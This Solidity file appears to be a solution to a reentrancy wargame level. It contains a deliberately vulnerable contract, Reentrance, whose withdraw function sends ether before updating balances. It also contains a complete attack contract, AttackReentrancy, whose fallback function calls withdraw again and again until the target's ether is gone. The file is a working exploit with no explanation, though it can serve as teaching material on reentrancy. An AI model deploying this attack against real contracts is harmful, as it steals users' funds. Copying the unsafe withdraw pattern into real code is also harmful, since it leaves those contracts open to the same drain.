// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}


contract AttackReentrancy {
    Reentrance target;
    uint public amount = 0.0001 ether;
    uint public recursionCount = 0;

    constructor(address payable _targetAddr) public payable {
        target = Reentrance(_targetAddr);
    }

    function donateToTarget() public {
        target.donate.value(amount)(address(this));
    }

    function attack() public {
        target.withdraw(amount);
    }

    fallback() external payable {
        if(address(target).balance != 0){
            recursionCount++;
            target.withdraw(amount);
        }
    }
}